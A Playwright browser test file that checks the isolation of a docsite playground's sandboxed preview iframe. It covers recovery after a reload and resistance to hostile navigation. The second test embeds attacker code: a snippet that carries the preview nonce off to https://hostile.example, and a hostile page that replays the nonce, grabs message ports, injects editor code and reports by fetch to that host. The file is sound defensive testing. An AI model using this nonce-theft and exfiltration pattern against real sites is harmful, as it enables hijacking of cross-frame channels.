// Copyright (c) Meta Platforms, Inc. and affiliates.

/**
 * @file playground-preview-isolation.spec.ts
 * @input A production docsite server (see ../playwright.config.ts)
 * @output Browser proof of the playground preview's trust boundary
 * @position Chromium contract for apps/docsite/src/app/playground —
 *   previewChannel.ts, PreviewStage.tsx, PlaygroundClient.tsx, preview/page.tsx.
 *
 * jsdom can drive the connector's state machine, and the unit suite does, but
 * it cannot prove the integration those states describe: that the iframe's
 * real `load` event is wired to the connector, that a fresh document really
 * receives the current code and theme, that a sandboxed document really has
 * no reach into the parent, and that a document previewed code navigated the
 * frame to really gets nothing. Everything here is an expectation only a
 * shipping engine can observe.
 *
 * Two lifecycles are pinned:
 *
 * 1. Reload: the preview document reloads itself (what previewed code calling
 *    `location.reload()` does). The playground must recover on its own — the
 *    replacement document renders the CURRENT code with the ACTIVE theme and
 *    mode before any edit — and an edit made afterwards must render in it.
 *
 * 2. Hostile navigation: previewed code navigates the frame to another
 *    origin, carrying the nonce it read from its own URL. That document must
 *    receive no port, no code and no theme, its replayed hello must earn
 *    nothing, and the playground must tear it down and restore a trusted
 *    preview that renders the current code again.
 */

import {expect, test, type Frame, type Page} from '@playwright/test';

const PREVIEW_URL_MARK = '/playground/preview#nonce=';
const HOSTILE_ORIGIN = 'https://hostile.example';

// Every wait below spans a document lifecycle: the preview loads the
// TypeScript compiler before it can render, and a recovery is a full
// teardown, navigation, handshake and render. Wide enough for a cold CI
// runner; `expect.poll` does not inherit the config's expect timeout.
const POLL = {timeout: 45_000};

/** The playground's current preview frame, if one is attached right now. */
function previewFrame(page: Page): Frame | undefined {
  return page
    .frames()
    .find(
      frame =>
        frame.parentFrame() === page.mainFrame() &&
        frame.url().includes(PREVIEW_URL_MARK),
    );
}

/** The current preview frame, which the caller has already waited for. */
function currentPreviewFrame(page: Page): Frame {
  const frame = previewFrame(page);
  if (!frame) {
    throw new Error('no preview frame is attached');
  }
  return frame;
}

/**
 * Text content of the current preview document, or null while there is none
 * or it is mid-replacement (a detached frame throws on evaluate).
 */
async function previewText(page: Page): Promise<string | null> {
  const frame = previewFrame(page);
  if (!frame) {
    return null;
  }
  try {
    return await frame.evaluate(() => document.body.innerText);
  } catch {
    return null;
  }
}

async function expectPreviewToRender(page: Page, text: string) {
  await expect
    .poll(() => previewText(page), {
      ...POLL,
      message: `preview renders "${text}"`,
    })
    .toContain(text);
}

/** The preview's `<Theme>` wrapper as the frame paints it. */
async function previewTheme(page: Page) {
  const frame = previewFrame(page);
  if (!frame) {
    return null;
  }
  try {
    return await frame.evaluate(() => {
      // The preview wraps the rendered example in its own <Theme>; the
      // docsite providers above it contribute another wrapper on the site
      // theme, so pick the one carrying the playground's theme.
      const wrappers = Array.from(
        document.querySelectorAll('div[data-astryx-theme]'),
      );
      const wrapper = wrappers[wrappers.length - 1];
      if (!wrapper) {
        return null;
      }
      const style = getComputedStyle(wrapper);
      return {
        mode: wrapper.getAttribute('data-theme'),
        bodyFont: style.getPropertyValue('--font-family-body').trim(),
      };
    });
  } catch {
    return null;
  }
}

/** Replace the editor's source; the playground debounces and ships it. */
async function setEditorCode(page: Page, code: string) {
  await expect
    .poll(
      () =>
        page.evaluate(() => {
          const monaco = (
            window as unknown as {
              monaco?: {editor: {getModels: () => Array<unknown>}};
            }
          ).monaco;
          return monaco?.editor.getModels().length ?? 0;
        }),
      POLL,
    )
    .toBeGreaterThan(0);
  await page.evaluate(source => {
    const monaco = (
      window as unknown as {
        monaco: {
          editor: {getModels: () => Array<{setValue: (v: string) => void}>};
        };
      }
    ).monaco;
    monaco.editor.getModels()[0].setValue(source);
  }, code);
}

function exampleRendering(text: string) {
  return [
    `import {Text} from '@astryxdesign/core/Text';`,
    `export default function Example() {`,
    `  return <Text>${text}</Text>;`,
    `}`,
  ].join('\n');
}

test.describe('playground preview isolation', () => {
  test('recovers from a reloaded preview document with the current code, theme and mode', async ({
    page,
  }) => {
    // ?theme=gothic seeds a non-default theme so "active theme" is
    // distinguishable from the default; Gothic's body face is Fustat.
    await page.goto('/playground?theme=gothic');
    await expectPreviewToRender(page, 'Welcome');

    // The production sandbox: an opaque origin with no reach into the parent
    // and no storage, which is the boundary everything below protects.
    const frame = currentPreviewFrame(page);
    expect(
      await page.locator('iframe[title="Preview"]').getAttribute('sandbox'),
    ).toBe('allow-scripts');
    expect(
      await frame.evaluate(() => {
        const blocked = (probe: () => unknown) => {
          try {
            probe();
            return false;
          } catch {
            return true;
          }
        };
        return {
          parentDocument: blocked(() => window.parent.document),
          localStorage: blocked(() => window.localStorage),
        };
      }),
    ).toEqual({parentDocument: true, localStorage: true});

    await page.getByRole('button', {name: 'Switch to dark'}).click();
    await expect
      .poll(() => previewTheme(page), POLL)
      .toMatchObject({
        mode: 'dark',
      });
    expect((await previewTheme(page))?.bodyFont).toContain('Fustat');

    // The preview document reloads itself: same URL, same spent nonce.
    const replacedUrl = frame.url();
    await frame.evaluate(() => {
      setTimeout(() => location.reload(), 0);
    });

    // The playground notices the second load, tears the frame down and mounts
    // a fresh one under a new nonce …
    await expect
      .poll(() => previewFrame(page)?.url() ?? null, POLL)
      .not.toBe(replacedUrl);
    expect(currentPreviewFrame(page).url()).toContain(PREVIEW_URL_MARK);

    // … and the new document renders the current code with the active theme
    // and mode, with no edit needed to wake it up.
    await expectPreviewToRender(page, 'Welcome');
    await expect
      .poll(() => previewTheme(page), POLL)
      .toMatchObject({
        mode: 'dark',
      });
    expect((await previewTheme(page))?.bodyFont).toContain('Fustat');

    // An edit made after the reload renders in the replacement document.
    await setEditorCode(page, exampleRendering('Reloaded and edited'));
    await expectPreviewToRender(page, 'Reloaded and edited');
    await expect
      .poll(() => previewTheme(page), POLL)
      .toMatchObject({
        mode: 'dark',
      });
    expect((await previewTheme(page))?.bodyFont).toContain('Fustat');
  });

  test('gives a document that previewed code navigated the frame to nothing, then restores the preview', async ({
    page,
  }) => {
    // Everything the hostile document observes is reported out of band,
    // because the playground destroys it as soon as it finishes loading.
    const reports: URL[] = [];
    await page.route(`${HOSTILE_ORIGIN}/**`, async route => {
      const url = new URL(route.request().url());
      if (url.pathname === '/report') {
        reports.push(url);
        await route.fulfill({status: 204});
        return;
      }
      if (url.pathname === '/slow.gif') {
        // Holds the hostile document's `load` event open so it has ample
        // time to receive anything the playground might send it.
        await new Promise(resolve => setTimeout(resolve, 1500));
        await route.fulfill({status: 404});
        return;
      }
      await route.fulfill({
        status: 200,
        contentType: 'text/html',
        body: hostileDocument(url.searchParams.get('nonce') ?? ''),
      });
    });

    await page.goto('/playground');
    await expectPreviewToRender(page, 'Welcome');
    const trustedUrl = currentPreviewFrame(page).url();

    // Previewed code, running inside the trusted document with everything it
    // knows, navigates the frame to another origin and takes the nonce along.
    await setEditorCode(
      page,
      [
        `location.href = '${HOSTILE_ORIGIN}/landing?nonce=' +`,
        `  encodeURIComponent(new URLSearchParams(location.hash.slice(1)).get('nonce') ?? '');`,
        `export default function Example() { return null; }`,
      ].join('\n'),
    );

    // The hostile document did run (this is not a vacuous pass) and did
    // replay the nonce.
    await expect
      .poll(() => reports.map(r => r.searchParams.get('event')), POLL)
      .toContain('hello-replayed');

    // Once it has run, take the hostile snippet back out of the editor so the
    // restored preview does not immediately navigate away again.
    await setEditorCode(page, exampleRendering('Restored preview'));

    // The playground tears the hostile document down and restores a trusted
    // preview under a fresh nonce, which renders the current code.
    await expect
      .poll(
        () =>
          page.frames().some(frame => frame.url().startsWith(HOSTILE_ORIGIN)),
        POLL,
      )
      .toBe(false);
    await expect
      .poll(() => previewFrame(page)?.url() ?? null, POLL)
      .not.toBe(trustedUrl);
    await expectPreviewToRender(page, 'Restored preview');

    // The hostile document got nothing: no port, so no code and no theme.
    const received = reports
      .filter(r => r.searchParams.get('event') === 'received')
      .map(r => ({
        type: r.searchParams.get('type'),
        ports: r.searchParams.get('ports'),
        via: r.searchParams.get('via'),
      }));
    expect(received.filter(r => r.via === 'port')).toEqual([]);
    expect(received.filter(r => r.ports !== '0')).toEqual([]);
    expect(received.map(r => r.type)).not.toContain('astryx-preview-connect');
    expect(received.map(r => r.type)).not.toContain('preview-code');
    expect(received.map(r => r.type)).not.toContain('preview-theme');

    // And the editor still holds what the user wrote.
    expect(
      await page.evaluate(() =>
        (
          window as unknown as {
            monaco: {
              editor: {getModels: () => Array<{getValue: () => string}>};
            };
          }
        ).monaco.editor
          .getModels()[0]
          .getValue(),
      ),
    ).toContain('Restored preview');
  });
});

/**
 * The page previewed code navigates the frame to. It plays the attacker the
 * reviewers described: it replays the nonce it was handed in a hello — once
 * immediately, then continuously, so a replay also lands in the window between
 * the playground discarding the old generation and React committing the new
 * iframe, while the old frame's window is still the one the playground holds —
 * adopts any port it is offered, answers `preview-ready` on it to draw out the
 * code and theme, tries to rewrite the editor, and reports every message it
 * sees.
 */
function hostileDocument(nonce: string): string {
  return `<!doctype html>
<html><head><meta charset="utf-8"></head><body>
<script>
  var report = function (params) {
    var url = new URL('${HOSTILE_ORIGIN}/report');
    Object.keys(params).forEach(function (key) {
      url.searchParams.set(key, String(params[key]));
    });
    fetch(url.toString(), {mode: 'no-cors', keepalive: true}).catch(function () {});
  };
  var describe = function (data) {
    return data && typeof data === 'object' && typeof data.type === 'string'
      ? data.type
      : typeof data;
  };
  window.addEventListener('message', function (event) {
    report({event: 'received', via: 'window', type: describe(event.data), ports: event.ports.length});
    if (event.ports.length > 0) {
      var port = event.ports[0];
      port.onmessage = function (portEvent) {
        report({event: 'received', via: 'port', type: describe(portEvent.data), ports: 0});
      };
      port.postMessage({type: 'preview-ready'});
      port.postMessage({type: 'preview-edit-code', code: 'export default () => "owned";'});
    }
  });
  var replayHello = function () {
    window.parent.postMessage({type: 'astryx-preview-hello', nonce: ${JSON.stringify(nonce)}}, '*');
  };
  report({event: 'loaded'});
  replayHello();
  report({event: 'hello-replayed'});
  setInterval(replayHello, 1);
</script>
<img src="${HOSTILE_ORIGIN}/slow.gif" alt="">
</body></html>`;
}
